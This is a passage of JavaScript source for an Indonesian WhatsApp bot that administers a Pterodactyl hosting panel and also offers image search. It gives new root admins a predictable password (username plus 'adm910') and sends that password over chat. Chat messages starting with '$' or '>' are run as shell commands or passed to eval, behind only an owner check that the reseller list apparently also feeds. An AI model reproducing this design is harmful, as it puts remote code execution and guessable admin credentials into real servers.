messageText += `Total Server : ${res.meta.pagination.count}`;
await nolan.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`*Contoh :* ${prefix+command} ${res.meta.pagination.current_page + 1} Tuk Melihat Halaman Selanjutnya`);
}
}
break

case "listuser": {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut List User Nya :\n\n";
for (let user of users) {
let u = user.attributes;
messageText += `ID : ${u.id} - Status : ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
messageText += `Page : ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Users : ${res.meta.pagination.count}`;
await nolan.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`*Contoh :* ${prefix+command} ${res.meta.pagination.current_page + 1} Tuk Melihat Halaman Selanjutnya`);
}
}
break

case "delserver": {
if (!isOwner) return m.reply(`Fitur Khusus Owner!`)
let srv = args[0]
if (!srv) return m.reply('ID Nya Mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('Server Tidak Ditemukan')
m.reply('Sukses Menghapus Server')
}
break
 
case "deluser": {
if (!isOwner) return m.reply(`Fitur Khusus Owner!`)
let usr = args[0]
if (!usr) return m.reply('ID Nya Mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('User Tidak Ditemukan')
m.reply('Sukses Menghapus User')
}
break

case "addadmin": {
if (!isOwner) return m.reply(mess.owner)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Contoh :* ${prefix+command} email,username,name,nomor`);
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"adm910"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = m.reply(`
╭──────────────────┈ ⳹
│『 *DONE CREAT ADMIN* 』
├────┈ ⳹
│ • *ID :* ${user.id}
│ • *UUID :* ${user.uuid}
│ • *Username :* ${user.username}
│ • *Email :* ${user.email}
│ • *Admin :* ${user.root_admin}
├────┈ ⳹
╰──────────────────┈ ⳹

Data sudah di kirim ke pripat chet`)
let teksnyo = `
*BERIKUT DATA ADMIN PANEL ANDA* `+readmore+`
╭──────────────────┈ ⳹
│『 *DANA ADMIN PANEL ANDA* 』
├────┈ ⳹
│ • *ID :* ${user.id}
│ • *Email :* ${user.email}
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
├────┈ ⳹
╰──────────────────┈ ⳹
Simpan Data Ini Baik Baik\nThanks`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Thank You For Purchasing`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363267733189530@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break

case "listadmin": {
if (!isOwner) return m.reply('Fitur Khusus Owner!');
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total : ${res.meta.pagination.count}`;
await nolan.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`*Contoh :* ${prefix+command} ${res.meta.pagination.current_page + 1} Tuk Melihat Halaman Selanjutnya`);
}
}
break

case 'addreseller':
case 'addres':
if (!isReseller && !isOwner) return m.reply('Fitur Khusus Owner dan Reseller!')
if (!args[0]) return m.reply(`*Contoh :* ${prefix+command} _Nomor_`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekseler = await nolan.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekseler.length == 0) return m.reply(`Masukkan Nomor Yang Valid dan Terdaftar Di WhatsApp`)
owner.push(bnnd)
fs.writeFileSync('./DATABASE/reseller.json', JSON.stringify(owner))
m.reply(`Sukses Addreseller Ke Nomer Tersebut`)
break

case 'delreseller':
case 'delres':
if (!isReseller && !isOwner) return m.reply('Fitur Khusus Owner dan Reseller!')
if (!args[0]) return m.reply(`*Contoh :* ${prefix+command} _Nomor_`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./DATABASE/reseller.json', JSON.stringify(owner))
m.reply(`Sukses Delreseller Ke Nomer Tersebut`)
break

case 'listreseller':
case 'listres':
if (!isReseller && !isOwner) return m.reply('Fitur Khusus Owner dan Reseller!')
tekso = 'List Reseller :\n\n'
for (let i of resel) {
tekso += `- ${i}\n`
}
tekso += `\n\n*Total :* ${resel.length}`
m.reply(tekso.trim())
break

// ========= FITUR BOT LAINYA ========= \\

case 'gimage': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Nolan MLBB`);
nolan.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
for (let bing of ini.result) {
await sleep(200)
await nolan.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
}
}
break

case 'google': {
if (!text) return m.reply(`*Contoh :* ${prefix + command} fatih arridho`)
let google = require('google-it')
nolan.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `• *Title* : ${g.title}\n`
teks += `• *Description* : ${g.snippet}\n`
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
m.reply(teks)
})
}
break
case 'pinn':case 'pin': case 'pinterest': {
if (!text) return m.reply(`*Contoh :* ${prefix+command} Nolan MLBB`)
await nolan.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}
})
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: nolan.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10);
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `${textbwhpin}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `${ownername} MENYEDIAKAN :`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"OWNER","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"GROUP OWNER","url":"${sgc}","merchant_url":"https://www.google.com"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'UDAH YA'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HASIL PENCARIAN ${namebot}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await nolan.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

// ========= UDAH JGN DI EDIT ========= \\

default:
if (budy.startsWith('$')) {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

if (budy.startsWith('>')) {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
}
catch (err) {
await m.reply(util.format(err))
}}}
}

catch (err) {
console.log(util.format(err))
let e = String(err)
nolan.sendMessage("6285920569458@s.whatsapp.net", {text: "Developer,Ada yang error\n\n" + util.format(e)})
}
}